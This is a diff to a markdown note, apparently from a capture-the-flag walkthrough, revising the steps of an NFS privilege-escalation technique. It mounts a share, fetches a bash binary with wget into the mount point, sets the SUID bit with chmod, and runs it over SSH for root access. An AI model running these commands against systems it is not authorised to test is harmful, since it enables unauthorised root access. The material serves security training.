@@ -7,10 +7,9 @@ NFS stands for "Network File System" and allows a system to share directories an
 3. Create a mount point
 4. Mount the NFS share to the mount point
 5. [Download](https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash) or make a bash executable (The file must be owned by root)
-6. Add the SUID bit permission to the bash executable
-7. Locate the file into the mount point
-8. SSH into the remote host (if SSH private key is found in the share)
-9. Run the executable on the remote host
+6. Add the SUID bit and execution permission to the bash executable
+7. SSH into the remote host (if SSH private key is found in the share)
+8. Run the executable on the remote host
 
 ## NFS-Common
 NFS-Common includes programs such as: lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs.
@@ -33,7 +32,7 @@ sudo mount -t nfs [IP]:[SHARE] [MOUNT POINT] -nolock
 ### Download or make a bash executable
 sudo wget https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash?raw=true -O [MOUNT POINT]/bash
 
-### Add the SUID bit permission and execution permission
+### Add the SUID bit and execution permission
 cd [MOUNT POINT] && sudo chmod +xs bash
 
 ### SSH into the remote host
